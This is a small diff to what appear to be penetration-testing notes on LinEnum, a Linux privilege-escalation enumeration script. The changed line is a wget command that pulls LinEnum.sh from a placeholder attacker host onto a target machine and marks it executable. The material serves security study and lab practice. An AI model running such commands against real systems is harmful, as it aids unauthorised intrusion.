@@ -11,7 +11,7 @@ LinEnum - bash script that performs common commands related to privilege escalat
 
 Get LinEnum on the target machine:
   python3 -m http.server 8000
-  wget <ATTACKER_IP>:PORT/LinEnum.sh
+  wget http://<ATTACKER_IP>:PORT/LinEnum.sh
   chmod +x LinEnum.sh
 or
   Copy the raw LinEnum code from github and paste into new file
